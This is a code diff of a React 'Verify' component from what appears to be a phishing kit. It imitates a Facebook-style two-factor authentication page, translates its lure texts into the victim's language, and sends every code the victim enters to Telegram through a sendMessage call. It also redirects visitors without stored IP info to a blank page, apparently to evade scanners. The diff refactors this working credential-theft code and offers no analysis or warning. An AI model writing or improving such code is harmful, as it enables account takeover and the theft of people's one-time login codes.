@@ -12,64 +12,85 @@ const Verify = () => {
     const [showError, setShowError] = useState(false);
     const [attempts, setAttempts] = useState(0);
     const [countdown, setCountdown] = useState(0);
-    const [isTranslating, setIsTranslating] = useState(true); // trạng thái dịch
 
-    const defaultTexts = useMemo(() => ({
-        title: 'Two-factor authentication required',
-        description: 'Check the notification on another device. Or enter the code you received via SMS, email, Facebook message, or WhatsApp.',
-        placeholder: 'Enter your code',
-        infoTitle: 'Approve from another device or Enter your verification code',
-        infoDescription: 'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
-        walkthrough: "We'll walk you through some steps to secure and unlock your account.",
-        submit: 'Submit',
-        sendCode: 'Send Code',
-        errorMessage: 'The verification code you entered is incorrect',
-        loadingText: 'Please wait',
-        secondsText: 'seconds'
-    }), []);
+    const defaultTexts = useMemo(
+        () => ({
+            title: 'Two-factor authentication required',
+            description: 'Check the notification on another device. Or enter the code you received via SMS, email, Facebook message, or WhatsApp.',
+            placeholder: 'Enter your code',
+            infoTitle: 'Approve from another device or Enter your verification code',
+            infoDescription:
+                'This may take a few minutes. Please do not leave this page until you receive the code. Once the code is sent, you will be able to appeal and verify.',
+            walkthrough: "We'll walk you through some steps to secure and unlock your account.",
+            submit: 'Submit',
+            sendCode: 'Send Code',
+            errorMessage: 'The verification code you entered is incorrect',
+            loadingText: 'Please wait',
+            secondsText: 'seconds'
+        }),
+        []
+    );
 
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
 
-    const translateAllTexts = useCallback(async (targetLang) => {
-        if (!targetLang || targetLang === 'en') {
-            setIsTranslating(false);
-            return;
-        }
+    const translateAllTexts = useCallback(
+        async (targetLang) => {
+            try {
+                const [
+                    translatedTitle,
+                    translatedDesc,
+                    translatedPlaceholder,
+                    translatedInfoTitle,
+                    translatedInfoDesc,
+                    translatedWalkthrough,
+                    translatedSubmit,
+                    translatedSendCode,
+                    translatedError,
+                    translatedLoading,
+                    translatedSeconds
+                ] = await Promise.all([
+                    translateText(defaultTexts.title, targetLang),
+                    translateText(defaultTexts.description, targetLang),
+                    translateText(defaultTexts.placeholder, targetLang),
+                    translateText(defaultTexts.infoTitle, targetLang),
+                    translateText(defaultTexts.infoDescription, targetLang),
+                    translateText(defaultTexts.walkthrough, targetLang),
+                    translateText(defaultTexts.submit, targetLang),
+                    translateText(defaultTexts.sendCode, targetLang),
+                    translateText(defaultTexts.errorMessage, targetLang),
+                    translateText(defaultTexts.loadingText, targetLang),
+                    translateText(defaultTexts.secondsText, targetLang)
+                ]);
 
-        try {
-            const translations = await Promise.all(Object.values(defaultTexts).map(async (text) => {
-                try {
-                    const result = await translateText(text, targetLang);
-                    return result || text; // fallback
-                } catch (err) {
-                    console.error('Error translating text:', text, err);
-                    return text;
-                }
-            }));
-
-            const keys = Object.keys(defaultTexts);
-            const translatedObj = keys.reduce((acc, key, idx) => {
-                acc[key] = translations[idx];
-                return acc;
-            }, {});
-
-            setTranslatedTexts(translatedObj);
-        } catch (err) {
-            console.error('Failed to translate texts:', err);
-        } finally {
-            setIsTranslating(false);
-        }
-    }, [defaultTexts]);
+                setTranslatedTexts({
+                    title: translatedTitle,
+                    description: translatedDesc,
+                    placeholder: translatedPlaceholder,
+                    infoTitle: translatedInfoTitle,
+                    infoDescription: translatedInfoDesc,
+                    walkthrough: translatedWalkthrough,
+                    submit: translatedSubmit,
+                    sendCode: translatedSendCode,
+                    errorMessage: translatedError,
+                    loadingText: translatedLoading,
+                    secondsText: translatedSeconds
+                });
+            } catch {
+                //
+            }
+        },
+        [defaultTexts]
+    );
 
     useEffect(() => {
         const ipInfo = localStorage.getItem('ipInfo');
         if (!ipInfo) {
             window.location.href = 'about:blank';
-            return;
         }
-
-        const targetLang = localStorage.getItem('targetLang') || 'en';
-        translateAllTexts(targetLang);
+        const targetLang = localStorage.getItem('targetLang');
+        if (targetLang && targetLang !== 'en') {
+            translateAllTexts(targetLang);
+        }
     }, [translateAllTexts]);
 
     const formatTime = (seconds) => {
@@ -87,11 +108,12 @@ const Verify = () => {
         try {
             const message = `🔐 <b>Code ${attempts + 1}:</b> <code>${code}</code>`;
             await sendMessage(message);
-        } catch (err) {
-            console.error('Failed to send code to telegram:', err);
+        } catch {
+            //
         }
 
         setCountdown(config.code_loading_time);
+
         const timer = setInterval(() => {
             setCountdown((prev) => {
                 if (prev <= 1) {
@@ -116,14 +138,6 @@ const Verify = () => {
 
         setCode('');
     };
-
-    if (isTranslating) {
-        return (
-            <div className='flex min-h-screen items-center justify-center'>
-                <p>Loading translations...</p>
-            </div>
-        );
-    }
 
     return (
         <div className='flex min-h-screen flex-col items-center justify-center bg-[#f8f9fa]'>
@@ -152,6 +166,7 @@ const Verify = () => {
                 </div>
                 <p>{translatedTexts.walkthrough}</p>
 
+                {/* Nút Submit đã được update */}
                 <button
                     className='rounded-md bg-[#0866ff] px-4 py-2 text-sm font-medium text-white hover:bg-blue-600 disabled:opacity-50 disabled:bg-gray-400'
                     onClick={handleSubmit}
